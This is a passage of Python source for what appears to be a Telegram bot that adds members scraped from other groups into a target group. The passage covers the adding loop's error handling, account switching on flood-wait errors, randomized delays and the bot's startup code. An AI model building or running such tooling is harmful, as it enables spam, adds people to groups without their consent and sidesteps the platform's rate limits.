                except ChatAdminRequiredError:
                    #text = f'User: {acc_name} -- Chat Admin rights needed to add'
                    #rxyzdev_log.info(text)
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    #await c.disconnect()
                    #break
                    continue
                except UserAlreadyParticipantError:
                    text = f'User: {acc_name} -- User is already a participant'
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    rxyzdev_log.info(text)
                    continue
                except FloodWaitError as e:
                    text = f'{str(e)}'
                    rxyzdev_log.info(text)
                    await asyncio.sleep(3)
                    await c.disconnect()
                    break
                except UserKickedError:
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    continue
                except UserNotMutualContactError:
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    continue
                except UserChannelsTooMuchError:
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    continue
                except ValueError as e:
                    text = f'Error in Entity'
                    rxyzdev_log.info(text)
                    rxyzdev_log.info(e)
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    break
                except KeyboardInterrupt:
                    print(f'---- Adding Terminated ----')
                    if temp[message.from_user.id]["index"] < len(members):
                        await log_status(temp[message.from_user.id]["scraped_grp"], temp[message.from_user.id]["index"], message.from_user.id)
                except Exception as e:
                    text = f'Error: {e}'
                    rxyzdev_log.info(text)
                    #rxyzdev_log.info(user)
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    if "database is locked" in str(e):
                        await asyncio.sleep(2)
                        await c.disconnect()
                        text = f'Trying use another account. If always {e} try /stop and run it again!'
                        rxyzdev_log.info(text)
                        break
                    continue
            await asyncio.sleep(2)
            await c.disconnect()

            if adding_status != 0:
                text = config.TEXT_LOG_SE
                await asyncio.sleep(3)
                rxyzdev_log.info(text)
            try:
                if temp[message.from_user.id]["index"] < approx_members_count:
                    await log_status(temp[message.from_user.id]["scraped_grp"], temp[message.from_user.id]["index"], message.from_user.id)
            except:
                pass

async def start_services():
    print('\n')
    print('------------------- Initalizing Telegram Bot -------------------')
    await app.start()
    print('----------------------------- DONE -----------------------------')
    print('\n')
    await idle()

if __name__ == "__main__":
    try:
        loop.run_until_complete(start_services())
    except KeyboardInterrupt:
        logging.info('----------------------- Service Stopped -----------------------')
